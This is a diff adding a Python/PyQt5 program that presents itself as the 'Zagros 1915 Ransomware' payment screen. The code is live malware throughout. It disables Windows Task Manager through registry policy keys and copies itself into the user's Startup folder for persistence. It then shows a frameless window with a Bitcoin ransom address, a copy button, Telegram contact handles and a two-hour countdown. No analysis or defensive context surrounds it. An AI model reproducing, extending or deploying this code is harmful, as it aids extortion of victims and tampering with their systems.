@@ -1,0 +1,58 @@
+import sys,os,shutil,time,winreg,psutil,threading
+from PyQt5.QtWidgets import *
+from PyQt5.QtCore import Qt,QTimer
+from PyQt5.QtGui import QFont
+startup = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+try:winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Policies\System",0,winreg.KEY_SET_VALUE),"DisableTaskMgr",0,winreg.REG_DWORD,1)
+except:pass
+try:winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",0,winreg.KEY_SET_VALUE),"DisableTaskMgr",0,winreg.REG_DWORD,1)
+except:pass
+try:p=os.path.join(os.environ['APPDATA'],r'Microsoft\Windows\Start Menu\Programs\Startup');os.makedirs(p) if not os.path.exists(p)else None;t=os.path.join(p,os.path.basename(sys.executable if getattr(sys,'frozen',False)else __file__));shutil.copy(sys.executable if getattr(sys,'frozen',False)else __file__,t)if not os.path.exists(t)else None
+except:pass
+class R(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowFlags(Qt.FramelessWindowHint)
+        self.r=7100
+        self.b="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        self.i()
+        self.t=QTimer();self.t.timeout.connect(self.u);self.t.start(1000)
+    def c(self):QApplication.clipboard().setText(self.b);self.s.setText("＄ BTC address copied!");QTimer.singleShot(2000,lambda:self.s.setText("＄ Waiting for payment..."))
+    def i(self):
+        self.setGeometry(450,200,1000,350);self.setStyleSheet("background-color:black")
+        w=QWidget();self.setCentralWidget(w);l=QVBoxLayout(w);l.setContentsMargins(20,20,20,20)
+        a=QLabel("""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠟⠉⠀⠀⠀⠈⠙⠿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
+⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
++----------------------------------------------------------------------------------------------------------------------------------------+
+|       _____                           _  ___  _ ____    ____                                                                           |
+|      |__  /__ _  __ _ _ __ ___  ___  / |/ _ \/ | ___|  |  _ \ __ _ _ __   ___  _ __ _____      ____ _ _ __ ___                         | 
+|        / // _` |/ _` | '__/ _ \/ __| | | (_) | |___ \  | |_) / _` | '_ \ / _ \| '_ ` _ \ \ /\ / / _` | '__/ _ \                        |
+|       / /| (_| | (_| | | | (_) \__ \ | |\__, | |___) | |  _ < (_| | | | | (_) | | | | | \ V  V / (_| | | |  __/                        |
+|      /____\__,_|\__, |_|  \___/|___/ |_|  /_/|_|____/  |_| \_\__,_|_| |_|\___/|_| |_| |_|\_/\_/ \__,_|_|  \___|                        |
+|                 |___/                                                                                                                  |
++----------------------------------------------------------------------------------------------------------------------------------------+
+
+https://t.me/ArmeniaRansom
+                          https://t.me/Charonx666                                                                  
+                  """)
+        a.setAlignment(Qt.AlignCenter);a.setFont(QFont("Courier New",9));a.setStyleSheet("color:red;padding:20px;background-color:black;border-radius:10px;margin:10px");l.addWidget(a)
+        h=QHBoxLayout();t=QLabel(f"BTC: {self.b}");t.setStyleSheet("color:gold;font-weight:bold;font-size:12px");btn=QPushButton("📋 Copy");btn.setStyleSheet("QPushButton{color:white;border:2px solid white;border-radius:5px;padding:5px 15px}QPushButton:hover{background-color:red}");btn.clicked.connect(self.c);h.addStretch();h.addWidget(t);h.addWidget(btn);h.addStretch();l.addLayout(h)
+        self.time=QLabel("02:00:00");self.time.setAlignment(Qt.AlignCenter);self.time.setFont(QFont("Courier",22,QFont.Bold));self.time.setStyleSheet("color:#ff4444;background-color:black;border:3px solid red;border-radius:15px;padding:15px;margin:10px");l.addWidget(self.time)
+        self.s=QLabel("＄  Telegram: @Charonx666 ＄ ");self.s.setAlignment(Qt.AlignCenter);self.s.setStyleSheet("color:#ffff00;font-size:13px;font-weight:bold;padding:10px;background-color:black;border-radius:8px;margin:5px");l.addWidget(self.s)
+    def u(self):
+        if self.r>0:self.r-=1;h=self.r//3600;m=(self.r%3600)//60;s=self.r%60;self.time.setText(f"{h:02d}:{m:02d}:{s:02d}")
+if __name__=="__main__":a=QApplication(sys.argv);w=R();w.show();sys.exit(a.exec_())
